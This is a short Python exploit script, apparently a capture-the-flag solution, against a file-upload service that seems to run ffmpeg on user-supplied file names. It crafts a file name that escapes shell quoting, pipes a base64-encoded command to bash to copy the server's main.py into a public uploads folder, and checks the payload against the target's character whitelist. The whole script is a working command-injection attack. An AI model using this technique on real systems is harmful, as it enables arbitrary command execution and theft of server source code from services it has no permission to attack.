import re
from base64 import b64encode
from random import choices
from string import ascii_letters

def check(s):
    for c in s:
        if bool(re.match("^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$", c)) is False:
            print(c)
    return None

name1 = ''.join(choices(ascii_letters, k=16))
name2 = ''.join(choices(ascii_letters, k=16))
name3 = ''.join(choices(ascii_letters, k=16))

print(name1 + '.gif')
uuid = input('uuid: ').strip()

script = f"cp main.py uploads/{uuid}/main.py".encode()

payload = f"{name1}.gif' '{name2}.png' | echo '{b64encode(script).decode()}' | base64 -d | bash || ffmpeg -i '{name3}.gif"

assert bool(re.match("^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$", payload)) and ".." not in payload, check(payload)
print(payload)